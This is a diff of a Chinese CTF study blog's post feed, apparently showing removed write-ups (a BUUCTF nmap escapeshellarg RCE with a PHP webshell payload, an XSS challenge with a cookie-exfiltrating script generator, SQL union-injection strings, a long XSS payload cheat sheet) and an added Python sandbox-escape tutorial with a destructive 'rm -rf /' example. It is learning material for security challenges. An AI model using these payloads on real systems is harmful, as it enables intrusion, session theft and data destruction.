-chair命令是进入到sandbox目录去
-</code></pre>
-<p><em>$sandbox &#x3D; md5(“glzjin”. $_SERVER[‘REMOTE_ADDR’]);<em>会将</em>glzjin</em>与<em>REMOTE_ADDR</em>中存储的数据进行MD5运算</p>
-<p>注意到最后一行中出现system()函数进行命令执行，因此我们可以尝试依次作为我们RCE的入手点。 </p>
-<p>其中的 <em>nmap -T5 -sT -Pn –host-timeout 2 -F</em>命令是对$host指定的主机的端口进行扫描</p>
-<p>接下来看看从哪里触发system()函数</p>
-<p>注意到程序中存在escapehsellarg()函数和escapeshellcmd()函数，看看他们可以实现什么样的功能？</p>
+<p>这里判断是否点击次数是19999次，Format 点进去是‘您已经点了 %d 次’，说明dword_4099F0存的是点击次数。然后判断是否点击19999次，输出BJD{1999902069a45792d233ac}</p>
+<p>说明flag是BJD{1999902069a45792d233ac} </p>
+<p>参考：</p>
 <blockquote>
-<p><a href="http://www.mi1k7ea.com/2019/07/04/%E6%B5%85%E8%B0%88escapeshellarg%E4%B8%8E%E5%8F%82%E6%95%B0%E6%B3%A8%E5%85%A5/">读这里了解更多</a></p>
-</blockquote>
-<blockquote>
-<p><a href="https://paper.seebug.org/164/">还有这里</a></p>
-</blockquote>
-<p>查阅资料我们发现，在PHP中，为了避免用户输入中的RCE风险，官方在5.2.18以上版本中加入了escapeshellarg()函数用于防止注入参数。其功能为：把字符串转码为可以在 shell 命令里使用的参数。</p>
-<p>原理是：</p>
-<pre><code>escapeshellarg() 将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号，这样以确保
-能够直接将一个字符串传入 shell 函数，并且还是确保安全的。对于用户输入的部分参数就应该使用这个函数。shell 函数包含 exec(), system() 执行运算符 。
-</code></pre>
-<p>简单地说，如果输入内容不包含单引号，则直接对输入的字符串添加一对单引号括起来；<br>如果输入内容包含单引号，则先对该单引号进行转义，再对剩余部分字符串添加相应对数的单引号括起来。</p>
-<p>同样的escapeshellcmd()函数也是发挥防止RCE风险的作用。其功能为：shell 元字符转义。</p>
-<p>原理是：    </p>
-<pre><code>escapeshellcmd() 对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义。 此函数保证用户输入的数据在传送到 exec() 或 system() 函数，或者 执行操作符 之前进行转义。
-
-反斜线（\）会在以下字符之前插入： &amp;#;`|*?~&lt;&gt;^()[]&#123;&#125;$\, \x0A 和 \xFF。 ‘ 和 “ 仅在不配对儿的时候被转义。 在 Windows 平台上，所有这些字符以及 % 和 ! 字符都会被空格代替。
-</code></pre>
-<p>简单地说，第一，如果输入内容中上述出现的特殊字符会被反斜杠给转义掉；<br>第二，如果单引号和双引号不是成对出现时，会被转义掉。</p>
-<p>然而，虽然一开始是为了降低风险，但如果出现</p>
-<pre><code>escapeshellarg()
-escapeshellcmd()
-</code></pre>
-<p>的形式，反而会导致进一步的RCE漏洞。<br>因此我们可以从这里入手，从而利用system()函数得到flag</p>
-<p>我们使用上传一句话木马的方式来RCE</p>
-<p>payload：</p>
-<pre><code>?host=&#39; &lt;?php @eval($_POST[&quot;hack&quot;]);?&gt; -oG hack.php &#39;
-</code></pre>
-<p>这个payload的意思是上传一句话木马的同时，将 nmap 的扫描结果保存为 hack.php 文件以免蚁剑连接时返回内容为空。<br>最后蚁剑连接，在根目录下找到flag  </p>
-<h3 id="在这道题目中其他需要注意的是关于转义符的理解："><a href="#在这道题目中其他需要注意的是关于转义符的理解：" class="headerlink" title="在这道题目中其他需要注意的是关于转义符的理解："></a>在这道题目中其他需要注意的是关于转义符的理解：</h3><p>上面提到escapeshellarg()函数会将 单引号进行利用或转义，然后再在两边加上引号引起来。<br>其转义的方式就是在前面加上一个\。同样的，escapeshellcmd()也会在对特殊符号进行转义，即在其前面加上\<br>其目的是让程序认为单引号仅仅作为符号存在，而不作为指令的一部分。</p>
-<p>例如：<br>如果传入</p>
-<pre><code>It&#39;s a dog.
-</code></pre>
-<p>就可能导致多余的’使得程序报错。<br>而使用转义符之后：</p>
-<pre><code>It\&#39;s a dog.
-#等于 &quot;It&#39;s a dog.&quot; 
-</code></pre>
-<p>这时会作为一个完整的字符串进行后续操作。  </p>
-<h1 id="记一道没有做出来的XSS攻击题目"><a href="#记一道没有做出来的XSS攻击题目" class="headerlink" title="记一道没有做出来的XSS攻击题目"></a>记一道没有做出来的XSS攻击题目</h1><p>上一周在做题时了解到利用Cooike可以进行XSS攻击，这周就遇到一道XSS，具体是利用XSS通过更改Cooike获取管理员权限来得到flag  </p>
-<blockquote>
-<p> 题目在这里 <a href="https://buuoj.cn/challenges#[CISCN2019%20%E5%8D%8E%E4%B8%9C%E5%8C%97%E8%B5%9B%E5%8C%BA]Web2">CISCN2019 华东北赛区 Web2 1</a>  </p>
-</blockquote>
-<p>一开始打开发现是一个非常正常的文章汇总页面，一时间以为走错地方了（）</p>
-<p>然后探索发现存在注册以及登录的功能。注册个admin，注册成功，说明这里似乎对用户名没有限制。  </p>
-<p>发现存在上传文章和反馈两个功能，翻看WP得知，这里的上传文章功能存在XSS漏洞，可以在这里上传XSS攻击代码，然后通过上传反馈得到管理员的SESSID，进行SQL注入后得到flag  </p>
-<p>我们得知这里存在一个admin.php,访问提示不是管理员无法查看（果然）  </p>
-<p>于是我们尝试进行XSS攻击。发现这里还存在WAF，会将’’(‘’转义成”（”  </p>
-<p>使用这个脚本  </p>
-<pre><code>in_str = &quot;(function()&#123;window.location.href=&#39;http://xss.buuoj.cn/index.php?do=api&amp;id=xpqwIP&amp;keepsession=0&amp;location=&#39;+escape((function()&#123;try&#123;return document.location.href&#125;catch(e)&#123;return&#39;&#39;&#125;&#125;)())+&#39;&amp;toplocation=&#39;+escape((function()&#123;try&#123;return top.location.href&#125;catch(e)&#123;return&#39;&#39;&#125;&#125;)())+&#39;&amp;cookie=&#39;+escape((function()&#123;try&#123;return document.cookie&#125;catch(e)&#123;return&#39;&#39;&#125;&#125;)())+&#39;&amp;opener=&#39;+escape((function()&#123;try&#123;return(window.opener&amp;&amp;window.opener.location.href)?window.opener.location.href:&#39;&#39;&#125;catch(e)&#123;return&#39;&#39;&#125;&#125;)());&#125;)();&quot;
-
-output = &quot;&quot;
-
-for c in in_str:
-    output += &quot;&amp;#&quot; + str(ord(c))
-
-print(&quot;&lt;svg&gt;&lt;script&gt;eval&amp;#40&amp;#34&quot; + output + &quot;&amp;#34&amp;#41&lt;/script&gt;&quot;)
-</code></pre>
-<p>生成payload后提交，得到url后进反馈  </p>
-<p>输入得到的url（题目提示要把靶机域名改为web）接下来解决验证码问题，题目中给出<em>substr(md5($str), 0, 6) &#x3D;&#x3D;&#x3D; “cfde39”：</em><br>这是一个MD5弱比较，使用下面这个脚本来生成验证码  </p>
-<pre><code>import hashlib
-import random
-import string
-
-target = "cfde39"
-
-while True:
-    # 生成一个随机字符串 (4 个字符)
-    s = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
-    hash_value = hashlib.md5(s.encode()).hexdigest()[:6]
-    if hash_value == target:
-        print(f"Found: &#123;s&#125;")
-        break
-
-</code></pre>
-<p>由于题目中提供的xss.buuoj.cn已经停止服务了，所以我们还要自己搭建一个用于接收反馈的平台  </p>
-<blockquote>
-<p>项目地址：<a href="https://github.com/firesunCN/BlueLotus_XSSReceiver">XSS数据接收平台（无SQL版）</a>  </p>
-</blockquote>
-<p>使用小皮面板来搭建这个平台，可惜的是搭建好后我的模板都神奇地消失了，一开始以为是Windows Defender的问题（虽然确实），但关掉之后还是没有js模板，导致平台一直没法用，只能止步于此了。  </p>
-<p>如果顺利的话，可以截取到管理员的SESSID，从而成功登录到admin.php，然后用</p>
-<pre><code>-2 union select 1,2,3#
-
--2 union select 1,database(),user()#
-
--2 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='ciscn'#
-
--2 union select 1,2,group_concat(column_name) from information_schema.columns where table_name='flag'#
-
--2 union select 1,2,group_concat(flagg) from ciscn.flag#
-</code></pre>
-<p>SQL联合查询得到flag  </p>
-<p>这里记录一些常见的XSS攻击代码  </p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(1)普通的XSS JavaScript注入</span><br><span class="line"></span><br><span class="line">&lt;SCRIPT SRC=http://3w.org/XSS/xss.js&gt;&lt;/SCRIPT&gt;</span><br><span class="line"></span><br><span class="line">(2)IMG标签XSS使用JavaScript命令</span><br><span class="line"></span><br><span class="line">&lt;IMG SRC=http://3w.org/XSS/xss.js/&gt;</span><br><span class="line"></span><br><span class="line">(3)IMG标签无分号无引号</span><br><span class="line"></span><br><span class="line">&lt;IMG SRC=javascript:alert(&#x27;XSS&#x27;)&gt;</span><br><span class="line"></span><br><span class="line">(4)IMG标签大小写不敏感</span><br><span class="line"></span><br><span class="line">&lt;IMG SRC=JaVaScRiPt:alert(&#x27;XSS&#x27;)&gt;</span><br><span class="line"></span><br><span class="line">(5)HTML编码(必须有分号)</span><br><span class="line"></span><br><span class="line">&lt;IMG SRC=javascript:alert(&quot;XSS&quot;)&gt;</span><br><span class="line"></span><br><span class="line">(6)修正缺陷IMG标签</span><br><span class="line"></span><br><span class="line">&lt;IMG &quot;&quot;&quot;&gt;&lt;SCRIPT&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;&quot;&gt;</span><br><span class="line"></span><br><span class="line">(7)formCharCode标签(计算器)</span><br><span class="line"></span><br><span class="line">&lt;IMG SRC=javascript:alert(String.fromCharCode(88,83,83))&gt;</span><br><span class="line"></span><br><span class="line">(8)UTF-8的Unicode编码(计算器)</span><br><span class="line"></span><br><span class="line">&lt;IMG SRC=jav..省略..S&#x27;)&gt;</span><br><span class="line"></span><br><span class="line">(9)7位的UTF-8的Unicode编码是没有分号的(计算器)</span><br><span class="line"></span><br><span class="line">&lt;IMG SRC=jav..省略..S&#x27;)&gt;</span><br><span class="line"></span><br><span class="line">(10)十六进制编码也是没有分号(计算器)</span><br><span class="line"></span><br><span class="line">&lt;IMG SRC=&amp;#x6A&amp;#x61&amp;#x76&amp;#x61..省略..&amp;#x58&amp;#x53&amp;#x53&amp;#x27&amp;#x29&gt;</span><br><span class="line"></span><br><span class="line">(11)嵌入式标签,将Javascript分开</span><br><span class="line"></span><br><span class="line">&lt;IMG SRC=&quot;jav ascript:alert(&#x27;XSS&#x27;);&quot;&gt;</span><br><span class="line"></span><br><span class="line">(12)嵌入式编码标签,将Javascript分开</span><br><span class="line"></span><br><span class="line">&lt;IMG SRC=&quot;jav ascript:alert(&#x27;XSS&#x27;);&quot;&gt;</span><br><span class="line"></span><br><span class="line">(13)嵌入式换行符</span><br><span class="line"></span><br><span class="line">&lt;IMG SRC=&quot;jav ascript:alert(&#x27;XSS&#x27;);&quot;&gt;</span><br><span class="line"></span><br><span class="line">(14)嵌入式回车</span><br><span class="line"></span><br><span class="line">&lt;IMG SRC=&quot;jav ascript:alert(&#x27;XSS&#x27;);&quot;&gt;</span><br><span class="line"></span><br><span class="line">(15)嵌入式多行注入JavaScript,这是XSS极端的例子</span><br><span class="line"></span><br><span class="line">&lt;IMG SRC=&quot;javascript:alert(&#x27;XSS&#x27;)&quot;&gt;</span><br><span class="line"></span><br><span class="line">(16)解决限制字符(要求同页面)</span><br><span class="line"></span><br><span class="line">&lt;script&gt;z=&#x27;document.&#x27;&lt;/script&gt;&lt;script&gt;z=z+&#x27;write(&quot;&#x27;&lt;/script&gt;&lt;script&gt;z=z+&#x27;&lt;script&#x27;&lt;/script&gt;&lt;script&gt;z=z+&#x27; src=ht&#x27;&lt;/script&gt;&lt;script&gt;z=z+&#x27;tp://ww&#x27;&lt;/script&gt;&lt;script&gt;z=z+&#x27;w.shell&#x27;&lt;/script&gt;&lt;script&gt;z=z+&#x27;.net/1.&#x27;&lt;/script&gt;&lt;script&gt;z=z+&#x27;js&gt;&lt;/sc&#x27;&lt;/script&gt;&lt;script&gt;z=z+&#x27;ript&gt;&quot;)&#x27;&lt;/script&gt;&lt;script&gt;eval_r(z)&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">(17)空字符12-7-1 T00LS - Powered by Discuz! Board</span><br><span class="line"></span><br><span class="line">https://www.a.com/viewthread.php?action=printable&amp;tid=15267 2/6perl -e &#x27;print &quot;&lt;IMG SRC=java\0script:alert(\&quot;XSS\&quot;)&gt;&quot;;&#x27; &gt; out</span><br><span class="line"></span><br><span class="line">(18)空字符2,空字符在国内基本没效果.因为没有地方可以利用</span><br><span class="line"></span><br><span class="line">perl -e &#x27;print &quot;&lt;SCR\0IPT&gt;alert(\&quot;XSS\&quot;)&lt;/SCR\0IPT&gt;&quot;;&#x27; &gt; out</span><br><span class="line"></span><br><span class="line">(19)Spaces和meta前的IMG标签</span><br><span class="line"></span><br><span class="line">&lt;IMG SRC=&quot; javascript:alert(&#x27;XSS&#x27;);&quot;&gt;</span><br><span class="line"></span><br><span class="line">(20)Non-alpha-non-digit XSS</span><br><span class="line"></span><br><span class="line">&lt;SCRIPT/XSS SRC=&quot;http://3w.org/XSS/xss.js&quot;&gt;&lt;/SCRIPT&gt;</span><br><span class="line"></span><br><span class="line">(21)Non-alpha-non-digit XSS to 2</span><br><span class="line"></span><br><span class="line">&lt;BODY onload!#$%&amp;()*~+-_.,:;?@[/|\]^`=alert(&quot;XSS&quot;)&gt;</span><br><span class="line"></span><br><span class="line">(22)Non-alpha-non-digit XSS to 3</span><br><span class="line"></span><br><span class="line">&lt;SCRIPT/SRC=&quot;http://3w.org/XSS/xss.js&quot;&gt;&lt;/SCRIPT&gt;</span><br><span class="line"></span><br><span class="line">(23)双开括号</span><br><span class="line"></span><br><span class="line">&lt;&lt;SCRIPT&gt;alert(&quot;XSS&quot;);//&lt;&lt;/SCRIPT&gt;</span><br><span class="line"></span><br><span class="line">(24)无结束脚本标记(仅火狐等浏览器)</span><br><span class="line"></span><br><span class="line">&lt;SCRIPT SRC=http://3w.org/XSS/xss.js?&lt;B&gt;</span><br><span class="line"></span><br><span class="line">(25)无结束脚本标记2</span><br><span class="line"></span><br><span class="line">&lt;SCRIPT SRC=//3w.org/XSS/xss.js&gt;</span><br><span class="line"></span><br><span class="line">(26)半开的HTML/JavaScript XSS</span><br><span class="line"></span><br><span class="line">&lt;IMG SRC=&quot;javascript:alert(&#x27;XSS&#x27;)&quot;</span><br><span class="line"></span><br><span class="line">(27)双开角括号</span><br><span class="line"></span><br><span class="line">&lt;iframe src=http://3w.org/XSS.html &lt;</span><br><span class="line"></span><br><span class="line">(28)无单引号 双引号 分号</span><br><span class="line"></span><br><span class="line">&lt;SCRIPT&gt;a=/XSS/alert(a.source)&lt;/SCRIPT&gt;</span><br><span class="line"></span><br><span class="line">(29)换码过滤的JavaScript</span><br><span class="line"></span><br><span class="line">\&quot;;alert(&#x27;XSS&#x27;);//</span><br><span class="line"></span><br><span class="line">(30)结束Title标签</span><br><span class="line"></span><br><span class="line">&lt;/TITLE&gt;&lt;SCRIPT&gt;alert(&quot;XSS&quot;);&lt;/SCRIPT&gt;</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p><a href="https://segmentfault.com/a/1190000022348467">更多XSS攻击代码</a>  </p>
-</blockquote>
-<p>顺便贴上几篇参考的WP  </p>
-<blockquote>
-<p><a href="https://www.cnblogs.com/AndyNoel/p/14764006.html">WP1</a>  </p>
-</blockquote>
-<blockquote>
-<p><a href="https://www.cnblogs.com/rabbittt/p/13372401.html">WP2</a>  </p>
-</blockquote>
-<blockquote>
-<p><a href="https://blog.csdn.net/mochu7777777/article/details/105212961">WP3</a>  </p>
-</blockquote>
-<blockquote>
-<p><a href="https://blog.51cto.com/u_16159500/6515093">WP4</a>  </p>
-</blockquote>
-<blockquote>
-<p><a href="https://ctf.eki.im/buuoj/ciscn-northeast-2019.html">WP5</a>  </p>
-</blockquote>
-<blockquote>
-<p><a href="https://blog.csdn.net/weixin_44652484/article/details/134169568">XSS数据接收平台配置教程</a></p>
+<p><a href="https://www.cnblogs.com/Tree-24/p/17311980.html">[BJDCTF2020]JustRE</a></p>
 </blockquote>
 ]]></content>
       <tags>
         <tag>周报</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>从零开始的CTF冒险（一）！</title>
-    <url>/posts/6249b303/</url>
-    <content><![CDATA[<h1 id="以此文记录我在学习CTF中的心路历程，日拱一卒，功不唐捐。"><a href="#以此文记录我在学习CTF中的心路历程，日拱一卒，功不唐捐。" class="headerlink" title="以此文记录我在学习CTF中的心路历程，日拱一卒，功不唐捐。"></a>以此文记录我在学习CTF中的心路历程，日拱一卒，功不唐捐。</h1><h2 id="一、WEB学习目录"><a href="#一、WEB学习目录" class="headerlink" title="一、WEB学习目录"></a>一、WEB学习目录</h2><h3 id="工具篇："><a href="#工具篇：" class="headerlink" title="工具篇："></a>工具篇：</h3><p>WEB的常用工具有：<br>BurpSuite（一款常用的抓包工具，应用广泛，文件上传必不可少的利器）<br>Hackerbar（浏览器插件，传参的好帮手）<br>蚁剑（连接工具）<br>还有许许多多的部署在Linux上的工具，……这里的东西就以后再来探索吧（）<br>###<br>拥有了入门的工具，就可以步入WEB的世界力（喜）</p>
-<h3 id="WEB包括哪些内容："><a href="#WEB包括哪些内容：" class="headerlink" title="WEB包括哪些内容："></a>WEB包括哪些内容：</h3><p>1.文件包含<br>2.文件上传</p>
-]]></content>
-      <tags>
-        <tag>CTF</tag>
       </tags>
   </entry>
   <entry>
@@ -531,208 +477,67 @@ while len(grid):
       </tags>
   </entry>
   <entry>
-    <title>DASCTF2024十月赛</title>
-    <url>/posts/d9660052/</url>
-    <content><![CDATA[<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="flow"><a href="#flow" class="headerlink" title="flow"></a>flow</h2><p>创建实例，提示：</p>
-<pre><code>Welcome to My Flask App
+    <title>Python沙箱逃逸（未完成）</title>
+    <url>/posts/9e349d62/</url>
+    <content><![CDATA[<h1 id="Python沙箱逃逸"><a href="#Python沙箱逃逸" class="headerlink" title="Python沙箱逃逸"></a>Python沙箱逃逸</h1><p>我们知道Python可以利用反序列化漏洞以及其他漏洞进行攻击，因此，在CTF中也会通过防火墙来进行防御。今天我们就讨论一下如何绕过防火墙来实现攻击行为，即Python的沙箱逃逸  </p>
+<h2 id="什么是Python沙箱"><a href="#什么是Python沙箱" class="headerlink" title="什么是Python沙箱"></a>什么是Python沙箱</h2><p>Python 沙箱（Sandbox） 是一个隔离的代码执行环境，用于安全地运行不受信任的代码，防止其对宿主系统造成破坏。在Python中，沙箱通过限制代码的访问权限（如文件读写、网络请求、系统命令执行等），确保程序只能在可控范围内操作。  </p>
+<p>比如在Python反序列化中，我们需要通过反序列化来让程序执行我们想让它执行的代码来实现相应的功能。在这个过程中，我们就借助了Python中的一些函数和模块来实现这些功能。</p>
+<p>同样的，为了避免安全风险，程序的设计者会想办法禁止我们利用这些危险的函数和模块。</p>
+<p>示例：（一个简单的Python沙箱）</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 创建一个禁用危险函数的环境</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">safe_exec</span>(<span class="params">code</span>):</span><br><span class="line">    allowed_builtins = &#123;<span class="string">&quot;abs&quot;</span>, <span class="string">&quot;max&quot;</span>, <span class="string">&quot;min&quot;</span>, <span class="string">&quot;print&quot;</span>&#125;  <span class="comment"># 白名单</span></span><br><span class="line">    restricted_globals = &#123;</span><br><span class="line">        <span class="string">&quot;__builtins__&quot;</span>: &#123;func: __builtins__[func] <span class="keyword">for</span> func <span class="keyword">in</span> allowed_builtins&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="built_in">exec</span>(code, restricted_globals)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Blocked:&quot;</span>, e)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 测试安全执行</span></span><br><span class="line">safe_exec(<span class="string">&quot;print(&#x27;Hello World&#x27;)&quot;</span>)          <span class="comment"># 正常</span></span><br><span class="line">safe_exec(<span class="string">&quot;open(&#x27;test.txt&#x27;, &#x27;w&#x27;)&quot;</span>)         <span class="comment"># 报错：open 不可用 </span></span><br></pre></td></tr></table></figure>
 
-This is a simple web app using Flask.  
+<h3 id="Python沙箱的实现原理和常见方法"><a href="#Python沙箱的实现原理和常见方法" class="headerlink" title="Python沙箱的实现原理和常见方法"></a>Python沙箱的实现原理和常见方法</h3><ul>
+<li><p><strong>Python沙箱的核心是限制代码的执行权限</strong></p>
+</li>
+<li><p>常用方法：<br>  模块和函数白名单&#x2F;黑名单</p>
+<p>  移除危险模块：禁用如 <code>os</code>、<code>sys</code>、<code>subprocess</code> 等模块。</p>
+<p>  覆盖内置函数：替换 <code>__import__</code>、<code>open</code>、<code>eval</code> 等函数。</p>
+<p>  示例：</p>
+  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 禁用 os 模块</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">sys.modules[<span class="string">&#x27;os&#x27;</span>] = <span class="literal">None</span>  <span class="comment"># 阻止导入os</span></span><br></pre></td></tr></table></figure></li>
+</ul>
+<h2 id="什么是Python沙箱逃逸"><a href="#什么是Python沙箱逃逸" class="headerlink" title="什么是Python沙箱逃逸"></a>什么是Python沙箱逃逸</h2><p>Python 沙箱逃逸（Sandbox Escape）是指在一个受限制的Python执行环境（沙箱）中，通过技术手段绕过安全限制，访问或控制本应被禁止的资源（如文件系统、操作系统命令、网络等）。沙箱通常用于隔离不可信代码，但在设计不当时可能被攻击者突破。</p>
+<h3 id="常用的-Python-内建函数"><a href="#常用的-Python-内建函数" class="headerlink" title="常用的 Python 内建函数"></a>常用的 Python 内建函数</h3><p>在 Python 的内建函数中，有一些函数可以帮助我们实现任意命令执行：</p>
+<pre><code>os.system() os.popen()
+commands.getstatusoutput() commands.getoutput()
+commands.getstatus()
+subprocess.call(command, shell=True) subprocess.Popen(command, shell=True)
+pty.spawn()
 </code></pre>
-<p>给出了任意文件读功能  </p>
-<p>看看 flask 应用的目录结构：  </p>
-<pre><code>my_flask_app/
-│
-├── app/
-│   ├── __init__.py
-│   ├── routes/
-│   │   ├── __init__.py
-│   │   ├── main.py
-│   │   └── auth.py
-│   ├── models/
-│   │   ├── __init__.py
-│   │   └── user.py
-│   ├── templates/
-│   │   ├── layout.html
-│   │   └── home.html
-│   └── static/
-│       ├── css/
-│       └── js/
-│
-├── config.py
-├── requirements.txt
-├── migrations/
-│   └── ...
-└── run.py  
+<p>可直接执行命令的模块有</p>
+<pre><code>os
+pty
+subprocess
+plarform
+commands
 </code></pre>
-<p>所以源码应该在 &#x2F;app&#x2F;main.py 中</p>
-<p>读源码：  </p>
-<pre><code>from flask import Flask, request, render_template_string, abort
+<p>有些时候，比如CTF，我们并不需要去执行命令，而是去读取目录下的flag文件即可，也就是说需要文件读取的模块来执行，常用的文件读取模块：</p>
+<pre><code>file
+open
+codecs
+fileinput
+</code></pre>
+<p>不过其中file只在python2中执行</p>
+<h2 id="常见的Python沙箱逃逸方法"><a href="#常见的Python沙箱逃逸方法" class="headerlink" title="常见的Python沙箱逃逸方法"></a>常见的Python沙箱逃逸方法</h2><p>我们上面提到，在沙箱中，我们往往无法直接利用上面的危险函数和模块，因此我们就需要导入相关模块并使用上述的函数实现命令执行。</p>
+<p>于是，Python沙箱逃逸的重点就落在了如何绕过防御措施来导入我们需要的模块并使用上述函数。</p>
+<h3 id="1-覆盖或替换函数-模块"><a href="#1-覆盖或替换函数-模块" class="headerlink" title="1.覆盖或替换函数&#x2F;模块"></a>1.覆盖或替换函数&#x2F;模块</h3><ul>
+<li><p>Python允许覆盖内置函数（如<code>__import__</code>、<code>open</code>、<code>eval</code> 等）或模块（如 <code>os</code>、<code>sys</code>）。<br>示例：  </p>
+  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 覆盖 __import__ 函数以绕过限制</span></span><br><span class="line"><span class="built_in">__import__</span> = <span class="keyword">lambda</span> x: os.system(<span class="string">&quot;rm -rf /&quot;</span>)  <span class="comment"># 恶意操作</span></span><br></pre></td></tr></table></figure></li>
+</ul>
+<h3 id="2-绕过导入限制"><a href="#2-绕过导入限制" class="headerlink" title="2.绕过导入限制"></a>2.绕过导入限制</h3><h3 id="3-遍历获取逃逸方法"><a href="#3-遍历获取逃逸方法" class="headerlink" title="3.遍历获取逃逸方法"></a>3.遍历获取逃逸方法</h3><p>Python 3</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"></span><br><span class="line">find_modules = &#123;<span class="string">&#x27;asyncio&#x27;</span>: [<span class="string">&#x27;subprocess&#x27;</span>, <span class="string">&#x27;sys&#x27;</span>, <span class="string">&#x27;__builtins__&#x27;</span>], <span class="string">&#x27;collections&#x27;</span>: [<span class="string">&#x27;__builtins__&#x27;</span>],</span><br><span class="line">                <span class="string">&#x27;concurrent&#x27;</span>: [<span class="string">&#x27;__builtins__&#x27;</span>], <span class="string">&#x27;ctypes&#x27;</span>: [<span class="string">&#x27;__builtins__&#x27;</span>], <span class="string">&#x27;curses&#x27;</span>: [<span class="string">&#x27;__builtins__&#x27;</span>],</span><br><span class="line">                <span class="string">&#x27;dbm&#x27;</span>: [<span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;sys&#x27;</span>, <span class="string">&#x27;__builtins__&#x27;</span>, <span class="string">&#x27;open&#x27;</span>], <span class="string">&#x27;distutils&#x27;</span>: [<span class="string">&#x27;sys&#x27;</span>, <span class="string">&#x27;__builtins__&#x27;</span>],</span><br><span class="line">                <span class="string">&#x27;email&#x27;</span>: [<span class="string">&#x27;__builtins__&#x27;</span>], <span class="string">&#x27;encodings&#x27;</span>: [<span class="string">&#x27;codecs&#x27;</span>, <span class="string">&#x27;sys&#x27;</span>, <span class="string">&#x27;__builtins__&#x27;</span>],</span><br><span class="line">                <span class="string">&#x27;ensurepip&#x27;</span>: [<span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;sys&#x27;</span>, <span class="string">&#x27;__builtins__&#x27;</span>], <span class="string">&#x27;html&#x27;</span>: [<span class="string">&#x27;__builtins__&#x27;</span>], <span class="string">&#x27;http&#x27;</span>: [<span class="string">&#x27;__builtins__&#x27;</span>],</span><br><span class="line">                <span class="string">&#x27;idlelib&#x27;</span>: [<span class="string">&#x27;__builtins__&#x27;</span>], <span class="string">&#x27;importlib&#x27;</span>: [<span class="string">&#x27;sys&#x27;</span>, <span class="string">&#x27;__import__&#x27;</span>, <span class="string">&#x27;__builtins__&#x27;</span>],</span><br><span class="line">                <span class="string">&#x27;json&#x27;</span>: [<span class="string">&#x27;codecs&#x27;</span>, <span class="string">&#x27;__builtins__&#x27;</span>], <span class="string">&#x27;lib2to3&#x27;</span>: [<span class="string">&#x27;__builtins__&#x27;</span>],</span><br><span class="line">                <span class="string">&#x27;logging&#x27;</span>: [<span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;sys&#x27;</span>, <span class="string">&#x27;__builtins__&#x27;</span>], <span class="string">&#x27;msilib&#x27;</span>: [<span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;sys&#x27;</span>, <span class="string">&#x27;__builtins__&#x27;</span>],</span><br><span class="line">                <span class="string">&#x27;multiprocessing&#x27;</span>: [<span class="string">&#x27;sys&#x27;</span>, <span class="string">&#x27;__builtins__&#x27;</span>], <span class="string">&#x27;pydoc_data&#x27;</span>: [<span class="string">&#x27;__builtins__&#x27;</span>], <span class="string">&#x27;sqlite3&#x27;</span>: [<span class="string">&#x27;__builtins__&#x27;</span>],</span><br><span class="line">                <span class="string">&#x27;test&#x27;</span>: [<span class="string">&#x27;__builtins__&#x27;</span>], <span class="string">&#x27;tkinter&#x27;</span>: [<span class="string">&#x27;sys&#x27;</span>, <span class="string">&#x27;__builtins__&#x27;</span>], <span class="string">&#x27;turtledemo&#x27;</span>: [<span class="string">&#x27;__builtins__&#x27;</span>],</span><br><span class="line">                <span class="string">&#x27;unittest&#x27;</span>: [<span class="string">&#x27;__builtins__&#x27;</span>], <span class="string">&#x27;urllib&#x27;</span>: [<span class="string">&#x27;__builtins__&#x27;</span>],</span><br><span class="line">                <span class="string">&#x27;venv&#x27;</span>: [<span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;subprocess&#x27;</span>, <span class="string">&#x27;sys&#x27;</span>, <span class="string">&#x27;__builtins__&#x27;</span>], <span class="string">&#x27;wsgiref&#x27;</span>: [<span class="string">&#x27;__builtins__&#x27;</span>],</span><br><span class="line">                <span class="string">&#x27;xml&#x27;</span>: [<span class="string">&#x27;__builtins__&#x27;</span>], <span class="string">&#x27;xmlrpc&#x27;</span>: [<span class="string">&#x27;__builtins__&#x27;</span>], <span class="string">&#x27;__future__&#x27;</span>: [<span class="string">&#x27;__builtins__&#x27;</span>],</span><br><span class="line">                <span class="string">&#x27;__phello__.foo&#x27;</span>: [<span class="string">&#x27;__builtins__&#x27;</span>], <span class="string">&#x27;_bootlocale&#x27;</span>: [<span class="string">&#x27;sys&#x27;</span>, <span class="string">&#x27;__builtins__&#x27;</span>],</span><br><span class="line">                <span class="string">&#x27;_collections_abc&#x27;</span>: [<span class="string">&#x27;sys&#x27;</span>, <span class="string">&#x27;__builtins__&#x27;</span>], <span class="string">&#x27;_compat_pickle&#x27;</span>: [<span class="string">&#x27;__builtins__&#x27;</span>],</span><br><span class="line">                <span class="string">&#x27;_compression&#x27;</span>: [<span class="string">&#x27;__builtins__&#x27;</span>], <span class="string">&#x27;_dummy_thread&#x27;</span>: [<span class="string">&#x27;__builtins__&#x27;</span>], <span class="string">&#x27;_markupbase&#x27;</span>: [<span 